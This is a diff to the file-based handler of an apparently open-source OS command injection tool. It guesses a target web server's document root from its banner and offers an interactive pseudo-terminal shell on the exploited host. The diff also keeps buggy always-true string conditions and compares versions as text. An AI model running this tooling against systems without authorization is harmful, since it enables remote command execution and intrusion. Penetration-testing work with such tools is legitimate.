@@ -35,14 +35,14 @@ from src.core.injections.controller import checks
 from src.core.requests import headers
 from src.core.requests import parameters
 
-from src.core.injections.semiblind_based.techniques.file_based import fb_injector
-from src.core.injections.semiblind_based.techniques.file_based import fb_payloads
-from src.core.injections.semiblind_based.techniques.file_based import fb_enumeration
-from src.core.injections.semiblind_based.techniques.file_based import fb_file_access
-from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_handler
+from src.core.injections.semiblind.techniques.file_based import fb_injector
+from src.core.injections.semiblind.techniques.file_based import fb_payloads
+from src.core.injections.semiblind.techniques.file_based import fb_enumeration
+from src.core.injections.semiblind.techniques.file_based import fb_file_access
+from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
 
 """
- The "file-based" technique on Semiblind-based OS Command Injection.
+ The "file-based" technique on Semiblind OS Command Injection.
 """
 
 """
@@ -80,8 +80,8 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
   call_tmp_based = False
   export_injection_info = False
   
-  injection_type = "Semiblind-based Command Injection"
-  technique = "file-based semiblind injection technique"
+  injection_type = "Semiblind Command Injection"
+  technique = "file-based injection technique"
 
   # Set temp path 
   if menu.options.tmp_path:
@@ -96,22 +96,34 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
       settings.SRV_ROOT_DIR = menu.options.srv_root_dir
     else:
       # Debian/Ubunt have been updated to use /var/www/html as default instead of /var/www.
-      if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
+      if "apache" in settings.SERVER_BANNER.lower():
+        if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
+          try:
+            check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
+            if check_version[0] > "2.3":
+              # Add "/html" to servers root directory
+              settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
+            else:
+              settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR 
+          except IndexError:
+            pass
+        # Add "/html" to servers root directory
+        elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
+          settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
+        else:
+          pass
+      # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
+      if "nginx" in settings.SERVER_BANNER.lower():
         try:
           check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
-          if check_version[0] > "2.3":
+          if check_version[0] >= "1.2.4":
             # Add "/html" to servers root directory
             settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
           else:
-            settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR 
+            # Add "/www" to servers root directory
+            settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/www"
         except IndexError:
           pass
-      # Add "/html" to servers root directory
-      elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
-        settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
-      else:
-        pass
-        
       path = urlparse.urlparse(url).path
       path_parts = path.split('/')
       count = 0
@@ -395,6 +407,8 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             while True:
               # Delete previous shell (text) files (output)
               delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+              if menu.options.verbose:
+                print ""
               if go_back == True:
                 break
               gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
@@ -403,6 +417,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 print "Pseudo-Terminal (type '?' for shell options)"
                 while True:
                   cmd = raw_input("Shell > ")
+                  cmd = checks.escaped_cmd(cmd)
                   if cmd.lower() in settings.SHELL_OPTIONS:
                     if cmd.lower() == "?":
                       menu.shell_options()
@@ -412,7 +427,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       sys.exit(0)
                     elif cmd.lower() == "back":
                       go_back = True
-                      if checks.check_next_attack_vector(technique, go_back) == True:
+                      if checks.next_attack_vector(technique, go_back) == True:
                         break
                       else:
                         if no_result == True:
@@ -438,7 +453,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
               elif gotshell in settings.CHOISE_NO:
                 if menu.options.verbose:
                   print ""
-                if checks.check_next_attack_vector(technique, go_back) == True:
+                if checks.next_attack_vector(technique, go_back) == True:
                   break
                 else:
                   if no_result == True:
